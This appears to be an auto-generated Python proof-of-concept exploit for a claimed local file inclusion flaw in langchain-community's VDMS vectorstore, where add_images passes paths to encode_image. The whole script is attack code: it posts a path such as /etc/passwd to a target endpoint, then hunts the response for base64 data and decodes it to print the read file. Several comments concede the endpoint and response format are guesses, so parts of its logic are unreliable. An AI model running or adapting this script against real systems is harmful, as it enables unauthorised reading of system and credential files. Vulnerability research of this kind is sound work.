#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-009
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_17.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in
langchain-community-only's VDMS vectorstore.

Vulnerability: The `add_images` method accepts a list of `uris` from
external input and passes each directly to `encode_image`, which opens
the file at the given path with no validation. An attacker can supply
paths like '../../etc/passwd' to read arbitrary files.

Usage:
    python poc_lfi.py [--url TARGET_URL] [--file FILE_TO_READ]

Example:
    python poc_lfi.py --url http://192.168.1.100:8000/api/v1/trigger --file /etc/passwd
"""

import argparse
import base64
import json
import sys

import requests


def exploit(target_url: str, file_to_read: str) -> None:
    """
    Send a malicious payload to the vulnerable endpoint and print the contents
    of the specified file.
    """
    # Build the payload: a list of URIs with path traversal
    # The target endpoint likely expects a JSON object containing a "uris" field.
    payload = {"uris": [file_to_read]}

    print(f"[*] Target URL: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")

    try:
        # Send POST request with JSON payload
        response = requests.post(
            target_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the server running and reachable?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP error: {e}")
        sys.exit(1)

    # Parse the response. The endpoint likely returns a JSON object containing
    # the base64-encoded file contents (or an array of such strings).
    try:
        result = response.json()
    except json.JSONDecodeError:
        print("[-] Failed to decode JSON response. Raw response:")
        print(response.text)
        sys.exit(1)

    # The structure of the response depends on the simulated endpoint.
    # Often the base64-encoded string is returned in a field like "texts",
    # "b64_texts", or "ids". We'll search the JSON for any field containing
    # a base64 string. If no explicit field is found, print the entire response.
    b64_found = []
    def search_b64(obj, path=""):
        """Recursively search for base64-encoded strings in JSON."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                search_b64(value, f"{path}.{key}")
        elif isinstance(obj, list):
            for idx, item in enumerate(obj):
                search_b64(item, f"{path}[{idx}]")
        elif isinstance(obj, str):
            # Check if the string looks like a base64-encoded payload (length is multiple of 4, contains valid chars)
            try:
                decoded = base64.b64decode(obj, validate=True)
                # If decode succeeds and is printable, it's likely the file content
                if decoded:
                    b64_found.append((path, obj, decoded))
            except Exception:
                pass

    search_b64(result)
    if b64_found:
        print("[+] Successfully extracted file content:")
        for path, b64_str, decoded in b64_found:
            print(f"   Found at {path}:")
            print(decoded.decode('utf-8', errors='replace'))
    else:
        # If no explicit base64 strings, try to find any string that looks like file content
        print("[?] No explicit base64 string found. Full response:")
        print(json.dumps(result, indent=2))
        # Attempt to find any raw text that might contain the read file
        if "text" in result:
            print("Potential content:")
            print(result["text"])


def main():
    parser = argparse.ArgumentParser(
        description="Exploit LFI in langchain-community VDMS add_images"
    )
    parser.add_argument(
        "--url",
        default="http://localhost:8000/api/v1/trigger",
        help="Target endpoint URL (default: http://localhost:8000/api/v1/trigger)",
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="File to read (default: /etc/passwd). Use a harmless file for testing.",
    )
    args = parser.parse_args()

    exploit(args.url, args.file)


if __name__ == "__main__":
    main()
